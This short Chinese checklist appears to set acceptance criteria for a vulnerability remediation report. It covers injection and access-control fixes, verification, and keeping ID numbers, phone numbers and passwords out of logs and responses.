- [ ] 每个漏洞都有「复现 → 危害说明 → 修复 → 验证」四段，缺一不可。
- [ ] 修复后的接口对注入 payload 返回空结果而不是全部数据。
- [ ] 越权修复后跨用户查询返回 403，同用户查询正常。
- [ ] 日志与响应体中不出现身份证、手机号明文，密码字段永远不回传。
